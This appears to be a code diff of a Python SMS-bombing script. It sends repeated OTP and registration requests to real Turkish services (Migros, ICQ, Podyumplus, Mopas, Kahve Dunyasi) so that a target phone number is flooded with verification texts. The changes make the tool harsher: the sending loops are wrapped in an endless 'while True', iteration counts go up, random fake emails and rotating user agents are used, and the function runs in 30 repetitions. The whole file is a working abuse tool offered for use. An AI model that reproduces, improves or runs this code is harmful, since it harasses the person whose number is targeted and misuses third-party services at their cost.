@@ -30,81 +30,82 @@ useragents = list(fake_useragent.FakeUserAgent().data_browsers['chrome'])
 
 chars = string.ascii_lowercase + string.digits
 count = 0
-def sikis():
+def bomb():
     global phone
     global count
-    for i in range(10):
-        mail = random.sample(chars,12)
-        mail = ''.join(mail)
-        mail = mail+'@gmail.com'
+    while True:
+        for i in range(10):
+            mail = random.sample(chars,12)
+            mail = ''.join(mail)
+            mail = mail+'@gmail.com'
 
-        data = {
-            'email': mail,
-            'phoneNumber': phone
-        }
-        ua = random.choice(useragents)
-        header = {
-            'User-agent': ua
-        }
-        try:
-            res = req.post('https://www.migros.com.tr/rest/users/v2/register/otp',json=data,headers=header)
-            if res.json()['successful'] == True:
-                count = count+1
-                print(f'{Fore.GREEN} {count} {Fore.RESET} Adet SMS gönderildi.')
-            else:
+            data = {
+                'email': mail,
+                'phoneNumber': phone
+            }
+            ua = random.choice(useragents)
+            header = {
+                'User-agent': ua
+            }
+            try:
+                res = req.post('https://www.migros.com.tr/rest/users/v2/register/otp',json=data,headers=header)
+                if res.json()['successful'] == True:
+                    count = count+1
+                    print(f'{Fore.GREEN} {count} {Fore.RESET} Adet SMS gönderildi.')
+                else:
+                    pass
+            except:
                 pass
-        except:
-            pass
-    for i in range(15):
-        s = req.session() 
-        headers3 = {
-            "content-type": "application/json",
-            "language": "tr",
-            "origin": "https://web.icq.com",
-            "referer": "https://web.icq.com/",
-            "sec-fetch-dest": "empty",
-            "sec-fetch-mode": "cors",
-            "sec-fetch-site": "cross-site",
-            "user-agent": ua
-        }
+        for i in range(15):
+            s = req.session() 
+            headers3 = {
+                "content-type": "application/json",
+                "language": "tr",
+                "origin": "https://web.icq.com",
+                "referer": "https://web.icq.com/",
+                "sec-fetch-dest": "empty",
+                "sec-fetch-mode": "cors",
+                "sec-fetch-site": "cross-site",
+                "user-agent": ua
+            }
 
-        data3 = json.dumps({"reqId":"5062-1662150555","params":{"phone":"90"+phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
+            data3 = json.dumps({"reqId":"5062-1662150555","params":{"phone":"90"+phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
 
-        r = s.post('https://u.icq.net/api/v86/rapi/auth/sendCode',headers=headers3,data=data3)
-        count = count+1
-        print(f'{Fore.GREEN} {count} {Fore.RESET} Adet SMS gönderildi.')
+            r = s.post('https://u.icq.net/api/v86/rapi/auth/sendCode',headers=headers3,data=data3)
+            count = count+1
+            print(f'{Fore.GREEN} {count} {Fore.RESET} Adet SMS gönderildi.')
 
-    s.get(f"https://www.podyumplus.com/index.php?route=account/account/control&telephone={phone}")
-    count = count+1
-    print(f'{Fore.GREEN} {count} {Fore.RESET} Adet SMS gönderildi.')
-
-    for i in range(5):
-        s = req.session()
-        s.get(f"https://mopas.com.tr/sms/activation?mobileNumber={phone}&pwd=&checkPwd=")
-        count = count+1
-        print(f'{Fore.GREEN} {count} {Fore.RESET} Adet SMS gönderildi.')
-    for i in range(10):
-        s = req.session()
-        s.get("https://core.kahvedunyasi.com/api/users/sms/send")
-        cookie = s.cookies.get("TS01ea2b29")
-        header ={
-            "Cookie": cookie,
-            "User-Agent": ua,
-        }  
-        data = {
-            "mobile_number": phone,
-            "token_type": "register_token",
-        }
-        r = s.post("https://core.kahvedunyasi.com/api/users/sms/send", data=data, headers=header)
-        s = req.session()
         s.get(f"https://www.podyumplus.com/index.php?route=account/account/control&telephone={phone}")
+        count = count+1
+        print(f'{Fore.GREEN} {count} {Fore.RESET} Adet SMS gönderildi.')
+
+        for i in range(15):
+            s = req.session()
+            s.get(f"https://mopas.com.tr/sms/activation?mobileNumber={phone}&pwd=&checkPwd=")
+            count = count+1
+            print(f'{Fore.GREEN} {count} {Fore.RESET} Adet SMS gönderildi.')
+        for i in range(15):
+            s = req.session()
+            s.get("https://core.kahvedunyasi.com/api/users/sms/send")
+            cookie = s.cookies.get("TS01ea2b29")
+            header ={
+                "Cookie": cookie,
+                "User-Agent": ua,
+            }  
+            data = {
+                "mobile_number": phone,
+                "token_type": "register_token",
+            }
+            r = s.post("https://core.kahvedunyasi.com/api/users/sms/send", data=data, headers=header)
+            s = req.session()
+            s.get(f"https://www.podyumplus.com/index.php?route=account/account/control&telephone={phone}")
 
 
 
 
 
 for i in range(30):
-    t = threading.Thread(target=sikis)
+    t = threading.Thread(target=bomb)
     t.run()
 
 os.system('pause')
